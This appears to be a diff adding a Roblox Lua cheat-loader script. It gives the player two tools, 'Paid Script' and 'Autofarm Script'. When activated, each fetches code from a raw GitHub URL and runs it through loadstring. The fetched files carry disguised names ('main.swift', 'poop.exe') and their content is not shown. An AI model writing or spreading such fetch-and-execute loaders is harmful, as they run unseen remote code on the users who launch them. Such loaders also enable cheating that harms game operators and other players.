@@ -1,0 +1,26 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{
+                Title = "HEY!";
+                Text = "Script tools loaded.";
+                Duration = 3;})
+
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Paid Script"
+tool.Activated:connect(function()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/3aze/LLC/main/script/main.swift")()
+
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Autofarm Script"
+tool.Activated:connect(function()
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/scriptfree/secret/main/tests/poop.exe")()
+
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
